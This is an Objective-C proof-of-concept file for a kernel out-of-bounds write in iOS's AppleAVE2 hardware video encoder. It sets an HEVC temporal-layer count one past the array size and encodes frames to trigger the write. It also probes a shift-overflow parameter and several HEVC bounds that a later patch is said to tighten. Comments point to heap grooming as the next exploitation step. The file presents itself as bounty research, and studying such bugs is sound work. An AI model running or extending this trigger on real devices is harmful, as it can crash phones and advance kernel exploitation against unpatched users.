/*
 * CVE-2026-84607 — AppleAVE2 Temporal Layer Off-by-One OOB PoC
 *
 * TARGET: iPhone 17 Pro, iOS 26.6.2 (AppleAVE2 v905.40.1)
 * BUG:    NumberOfTemporalLayers accepts 8 on 26.6.2
 *         Patch (26.7.2) changes check from (n-1)<=7 to (n-1)<7
 *         Setting n=8 indexes array[7] in a 7-element array → OOB
 *
 * RISK:   *** THIS CAN CAUSE A KERNEL PANIC ***
 *         The OOB write hits kernel heap. Depending on what's adjacent,
 *         this may panic, corrupt state, or silently succeed.
 *
 *         BEFORE RUNNING:
 *         1. Device is backed up
 *         2. OTA updates blocked in /etc/hosts
 *         3. Mac ready to pull .ips panic logs:
 *            Settings → Privacy → Analytics → Analytics Data → panic-*
 *            Or: Console.app → iPhone → panic-* logs
 *
 * LEGAL:  Apple Security Bounty research. Own device. DMCA §1201(f)(j).
 *
 * This file is meant to be integrated into deploy_to_iphone.sh.
 * See the deploy script for the full app with UI buttons.
 */

#import <VideoToolbox/VideoToolbox.h>
#import <CoreMedia/CoreMedia.h>
#import <CoreVideo/CoreVideo.h>

// Compression callback — receives encoded output (or error)
static void oobOutputCallback(
    void *ctx,
    void *sourceFrameRefCon,
    OSStatus status,
    VTEncodeInfoFlags infoFlags,
    CMSampleBufferRef sampleBuffer)
{
    if (status != noErr) {
        NSLog(@"[OOB] Encode callback error: %d", (int)status);
        return;
    }
    if (sampleBuffer) {
        NSLog(@"[OOB] Got encoded output after OOB trigger");
        // If we get here without panic, the OOB write happened
        // but didn't hit anything critical. Still confirms the bug.
    }
}

/*
 * Tier 1 test: NumberOfTemporalLayers = 8 (off-by-one)
 *
 * The kernel driver has an array sized for 7 temporal layers.
 * Setting the count to 8 causes the driver to write to index 7,
 * which is one past the end of the array.
 *
 * What happens depends on heap layout:
 * - If adjacent memory is unused padding: silent corruption
 * - If adjacent memory is a function pointer: crash → panic
 * - If adjacent memory is a size field: potential heap overflow cascade
 */
void testTemporalLayerOOB(void) {
    NSLog(@"[OOB] === Tier 1: NumberOfTemporalLayers Off-by-One ===");
    NSLog(@"[OOB] Setting NumberOfTemporalLayers = 8 (limit on 26.7.2 is <7)");

    VTCompressionSessionRef session = NULL;
    NSDictionary *spec = @{
        (NSString *)kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder: @YES,
        (NSString *)kVTVideoEncoderSpecification_RequireHardwareAcceleratedVideoEncoder: @YES,
    };

    // Use smaller resolution to minimize kernel memory pressure
    int width = 320, height = 240;

    OSStatus status = VTCompressionSessionCreate(
        kCFAllocatorDefault, width, height, kCMVideoCodecType_HEVC,
        (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
        oobOutputCallback, NULL, &session);

    if (status != noErr) {
        NSLog(@"[OOB] Session creation failed: %d", (int)status);
        return;
    }
    NSLog(@"[OOB] HEVC session created (320x240, minimal)");

    // Enable temporal compression (required for temporal layers to matter)
    VTSessionSetProperty(session,
        CFSTR("AllowTemporalCompression"), kCFBooleanTrue);
    VTSessionSetProperty(session,
        CFSTR("AllowFrameReordering"), kCFBooleanTrue);

    // THE TRIGGER: Set temporal layer count to 8 (OOB by 1)
    status = VTSessionSetProperty(session,
        CFSTR("NumberOfTemporalLayers"), (__bridge CFTypeRef)@(8));
    NSLog(@"[OOB] Set NumberOfTemporalLayers=8: %d (%s)",
        (int)status, status == noErr ? "ACCEPTED" : "REJECTED");

    if (status != noErr) {
        NSLog(@"[OOB] Property rejected — may be validated at set time on this firmware");
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return;
    }

    // Verify it stuck
    CFTypeRef readBack = NULL;
    VTSessionCopyProperty(session, CFSTR("NumberOfTemporalLayers"),
        kCFAllocatorDefault, &readBack);
    if (readBack) {
        NSLog(@"[OOB] Readback: NumberOfTemporalLayers = %@",
            (__bridge id)readBack);
        CFRelease(readBack);
    }

    // Prepare encoder (this may trigger kernel-side array allocation)
    NSLog(@"[OOB] PrepareToEncodeFrames (may trigger kernel array alloc)...");
    status = VTCompressionSessionPrepareToEncodeFrames(session);
    NSLog(@"[OOB] PrepareToEncode: %d", (int)status);

    if (status != noErr) {
        NSLog(@"[OOB] PrepareToEncode failed — kernel may have caught the OOB at alloc time");
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return;
    }

    // Create a minimal pixel buffer
    CVPixelBufferRef pb = NULL;
    status = CVPixelBufferCreate(kCFAllocatorDefault, width, height,
        kCVPixelFormatType_420YpCbCr8BiPlanarFullRange,
        (__bridge CFDictionaryRef)@{
            (NSString *)kCVPixelBufferIOSurfacePropertiesKey: @{}
        }, &pb);

    if (status != noErr || !pb) {
        NSLog(@"[OOB] Pixel buffer creation failed: %d", (int)status);
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return;
    }

    // Fill with neutral gray
    CVPixelBufferLockBaseAddress(pb, 0);
    void *y = CVPixelBufferGetBaseAddressOfPlane(pb, 0);
    if (y) memset(y, 0x80,
        CVPixelBufferGetBytesPerRowOfPlane(pb, 0) *
        CVPixelBufferGetHeightOfPlane(pb, 0));
    void *uv = CVPixelBufferGetBaseAddressOfPlane(pb, 1);
    if (uv) memset(uv, 0x80,
        CVPixelBufferGetBytesPerRowOfPlane(pb, 1) *
        CVPixelBufferGetHeightOfPlane(pb, 1));
    CVPixelBufferUnlockBaseAddress(pb, 0);

    // ENCODE — this sends the OOB temporal layer count to the kernel
    // The kernel driver will process this frame with temporal_layers=8,
    // potentially writing to m_psaTCmd[7] or equivalent in a size-7 array.
    NSLog(@"[OOB] *** ENCODING FRAME WITH TEMPORAL_LAYERS=8 ***");
    NSLog(@"[OOB] If device panics here, check panic log for AppleAVE2 backtrace");

    status = VTCompressionSessionEncodeFrame(session, pb,
        CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
    NSLog(@"[OOB] EncodeFrame result: %d", (int)status);

    // If we get here, the encode didn't immediately panic
    // Complete and check for deferred panic
    NSLog(@"[OOB] CompleteFrames...");
    status = VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
    NSLog(@"[OOB] CompleteFrames: %d", (int)status);

    // Encode a few more frames to increase chance of hitting the OOB path
    for (int i = 1; i <= 3; i++) {
        CVPixelBufferLockBaseAddress(pb, 0);
        y = CVPixelBufferGetBaseAddressOfPlane(pb, 0);
        if (y) memset(y, 0x40 + i * 0x20,
            CVPixelBufferGetBytesPerRowOfPlane(pb, 0) *
            CVPixelBufferGetHeightOfPlane(pb, 0));
        CVPixelBufferUnlockBaseAddress(pb, 0);

        status = VTCompressionSessionEncodeFrame(session, pb,
            CMTimeMake(i, 30), kCMTimeInvalid, NULL, NULL, NULL);
        NSLog(@"[OOB] Frame %d encode: %d", i, (int)status);
    }

    status = VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
    NSLog(@"[OOB] Final CompleteFrames: %d", (int)status);

    CVPixelBufferRelease(pb);
    VTCompressionSessionInvalidate(session);
    CFRelease(session);

    NSLog(@"[OOB] === Test complete without panic ===");
    NSLog(@"[OOB] If no panic: OOB write likely hit non-critical heap padding.");
    NSLog(@"[OOB] Next step: heap grooming to place a controlled object adjacent.");
}

/*
 * Tier 1b test: log2_max_minus4 overflow
 *
 * The patch bounds this to <= 12. On 26.6.2, values > 12 are accepted.
 * Used in: 1 << (log2_max_minus4 + 4) for buffer sizing.
 * If we set it to 28+, the shift overflows: 1 << 32 = 0 on 32-bit,
 * undefined on 64-bit → potential zero-size allocation → heap overflow.
 */
void testLog2MaxOverflow(void) {
    NSLog(@"[OOB] === Tier 1b: log2_max_minus4 Overflow ===");

    VTCompressionSessionRef session = NULL;
    NSDictionary *spec = @{
        (NSString *)kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder: @YES,
        (NSString *)kVTVideoEncoderSpecification_RequireHardwareAcceleratedVideoEncoder: @YES,
    };

    OSStatus status = VTCompressionSessionCreate(
        kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
        (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
        oobOutputCallback, NULL, &session);

    if (status != noErr) {
        NSLog(@"[OOB] Session creation failed: %d", (int)status);
        return;
    }

    // Test what values log2_max_minus4 accepts
    int testValues[] = {0, 4, 8, 12, 13, 16, 20, 24, 28, 32, 60};
    int numTests = sizeof(testValues) / sizeof(testValues[0]);

    for (int i = 0; i < numTests; i++) {
        status = VTSessionSetProperty(session,
            CFSTR("log2_max_minus4"), (__bridge CFTypeRef)@(testValues[i]));
        NSLog(@"[OOB] log2_max_minus4 = %d: %s",
            testValues[i],
            status == noErr ? "ACCEPTED" : "REJECTED");
    }

    VTCompressionSessionInvalidate(session);
    CFRelease(session);
}

/*
 * Tier 2 test: VPS/SPS/PPS parameter probing
 *
 * Tests which RequiredHEVC* properties accept out-of-range values.
 * Does NOT encode — just probes property acceptance.
 */
void testVPSSPSPPSBounds(void) {
    NSLog(@"[OOB] === Tier 2: VPS/SPS/PPS Bound Probing ===");

    VTCompressionSessionRef session = NULL;
    NSDictionary *spec = @{
        (NSString *)kVTVideoEncoderSpecification_EnableHardwareAcceleratedVideoEncoder: @YES,
        (NSString *)kVTVideoEncoderSpecification_RequireHardwareAcceleratedVideoEncoder: @YES,
    };

    OSStatus status = VTCompressionSessionCreate(
        kCFAllocatorDefault, 320, 240, kCMVideoCodecType_HEVC,
        (__bridge CFDictionaryRef)spec, NULL, kCFAllocatorDefault,
        oobOutputCallback, NULL, &session);

    if (status != noErr) {
        NSLog(@"[OOB] Session creation failed: %d", (int)status);
        return;
    }

    // Test RequiredHEVCVideoParameterSetAlphaLayerID (limit should be < 63)
    NSLog(@"[OOB] --- VPS Alpha Layer ID ---");
    int layerTests[] = {0, 32, 62, 63, 64, 100, 255};
    for (int i = 0; i < 7; i++) {
        status = VTSessionSetProperty(session,
            CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"),
            (__bridge CFTypeRef)@(layerTests[i]));
        NSLog(@"[OOB] AlphaLayerID = %d: %s %s",
            layerTests[i],
            status == noErr ? "ACCEPTED" : "REJECTED",
            layerTests[i] >= 63 ? "*** OVER PATCHED LIMIT ***" : "");
    }

    // Test RequiredHEVCSequenceParameterSetRepFormatIndex
    NSLog(@"[OOB] --- SPS Rep Format Index ---");
    int repTests[] = {0, 1, 2, 3, 10, 50, 255};
    for (int i = 0; i < 7; i++) {
        status = VTSessionSetProperty(session,
            CFSTR("RequiredHEVCSequenceParameterSetRepFormatIndex"),
            (__bridge CFTypeRef)@(repTests[i]));
        NSLog(@"[OOB] RepFormatIndex = %d: %s %s",
            repTests[i],
            status == noErr ? "ACCEPTED" : "REJECTED",
            repTests[i] >= 2 ? "*** OVER PATCHED LIMIT ***" : "");
    }

    // Test NumberOfSlices (no known limit in patch, but interesting)
    NSLog(@"[OOB] --- Number of Slices ---");
    int sliceTests[] = {1, 4, 16, 64, 256, 257, 1000};
    for (int i = 0; i < 7; i++) {
        status = VTSessionSetProperty(session,
            CFSTR("NumberOfSlices"),
            (__bridge CFTypeRef)@(sliceTests[i]));
        NSLog(@"[OOB] NumberOfSlices = %d: %s %s",
            sliceTests[i],
            status == noErr ? "ACCEPTED" : "REJECTED",
            sliceTests[i] > 256 ? "*** POTENTIALLY OVER LIMIT ***" : "");
    }

    // Test ChromaQPIndexOffsetMultiPPS (limit should be <= 5)
    NSLog(@"[OOB] --- Chroma QP Index Offset ---");
    int chromaTests[] = {0, 3, 5, 6, 10, 50, 255};
    for (int i = 0; i < 7; i++) {
        status = VTSessionSetProperty(session,
            CFSTR("ChromaQPIndexOffsetMultiPPS"),
            (__bridge CFTypeRef)@(chromaTests[i]));
        NSLog(@"[OOB] ChromaQPOffset = %d: %s %s",
            chromaTests[i],
            status == noErr ? "ACCEPTED" : "REJECTED",
            chromaTests[i] > 5 ? "*** OVER PATCHED LIMIT ***" : "");
    }

    VTCompressionSessionInvalidate(session);
    CFRelease(session);
}
